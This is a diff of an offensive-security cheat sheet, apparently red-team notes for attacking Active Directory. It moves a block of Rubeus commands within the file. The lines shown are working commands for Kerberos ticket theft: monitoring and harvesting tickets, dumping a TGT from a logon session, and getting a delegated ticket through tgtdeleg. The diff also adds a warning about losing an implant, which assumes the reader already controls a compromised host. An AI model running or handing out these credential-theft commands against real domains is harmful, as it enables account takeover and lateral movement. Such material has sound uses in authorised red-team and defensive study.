@@ -545,14 +545,15 @@ Brute Password spray:
 #### List tickets
 https://specterops.gitbook.io/ghostpack/rubeus/ticket-extraction-and-harvesting
 
-Monitor tickets currently on System:
-- All - ```Rubeus.exe monitor /interval:30 /runfor:300 /nowrap``` 
-- Specific User on Machine - ```rubeus.exe harvest /targetuser:Mary /interval:10 /runfor:100 /nowrap```
-  - (```harvest```=```monitor``` + autorenewal for tickets)
-
 Get tickets currently on System:
 - List all kerberos tickets from current logon sessions - ```Rubeus.exe triage```
 - Steal TGT from a specific Logon Session - ```Rubeus.exe dump /luid:0x6042e /service:krbtgt```
+
+
+Harvest tickets currently on System (Warning - this will lose an implant as its interactive!):
+- All - ```Rubeus.exe monitor /interval:30 /runfor:300 /nowrap``` 
+- Specific User on Machine - ```rubeus.exe harvest /targetuser:Mary /interval:10 /runfor:100 /nowrap```
+  - (```harvest```=```monitor``` + autorenewal for tickets)
 
 #### Tgtdeleg
 Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
